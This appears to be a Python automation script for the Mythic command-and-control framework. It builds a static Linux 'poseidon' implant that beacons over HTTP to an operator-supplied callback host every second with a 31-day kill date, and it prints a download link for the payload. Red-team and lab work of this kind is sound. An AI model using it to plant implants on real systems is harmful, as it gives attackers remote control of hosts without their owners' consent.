#!/usr/bin/env python3

from datetime import datetime, timedelta
from argparse import ArgumentParser
from pathlib import Path
from sys import stderr
from asyncio import run as a_run
from mythic import mythic

async def generate_payload(mythic_instance, callback_host):
  payload_response = await mythic.create_payload(
    mythic=mythic_instance,
    payload_type_name="poseidon",
    filename="poseidon-static.bin",
    operating_system="Linux",
    commands=[],
    c2_profiles=[
      {
        "c2_profile": "http",
        "c2_profile_parameters": {
          "callback_host": f"http://{callback_host}",
          "callback_port": "80",
          "callback_interval": "1",
          "killdate": (datetime.now() + timedelta(days=31)).strftime(
            "%Y-%m-%d"
          ),
        },
      }
    ],
    build_parameters=[
      {
        "name": "mode",
        "value": "default",
      },
      {
        "name": "static",
        "value": True,
      },
    ],
    return_on_complete=True,

  )
  print(f"{payload_response=}", file=stderr)
  if payload_response.get("uuid"):
    return payload_response["uuid"]
  raise RuntimeError(f"Error with {payload_response=}")

async def query_payload(mythic_instance, payload_uuid):
  payload_info = await mythic.execute_custom_query(
    mythic=mythic_instance,
    query="""
    query GetPayloadDetails ($payload_uuid: String!) {
      payload(where: {uuid: {_eq: $payload_uuid}}) {
        filemetum {
          agent_file_id
        }
      }
    }
    """,
    variables={"payload_uuid": payload_uuid}
  )
  print(f"{payload_info=}", file=stderr)
  if payload_info.get("payload")[0]["filemetum"]["agent_file_id"]:
    return payload_info.get("payload")[0]["filemetum"]["agent_file_id"]
  raise RuntimeError(f"Error with {payload_info=}")


async def main():
  parser = ArgumentParser()
  parser.add_argument("api_token_path", help="Path to the api token")
  parser.add_argument("callback_host", help="Host to callback to")
  args = parser.parse_args()
  mythic_instance = await mythic.login(
    apitoken=Path(args.api_token_path).read_text(encoding="utf-8"),
    server_ip="127.0.0.1",
    server_port=7443,
    timeout=-1,
  )
  payload_uuid = await generate_payload(mythic_instance, args.callback_host)
  payload_download_uuid = await query_payload(mythic_instance, payload_uuid)
  print(f"https://{args.callback_host}:7443/direct/download/{payload_download_uuid}")


if __name__ == "__main__":
  a_run(main())
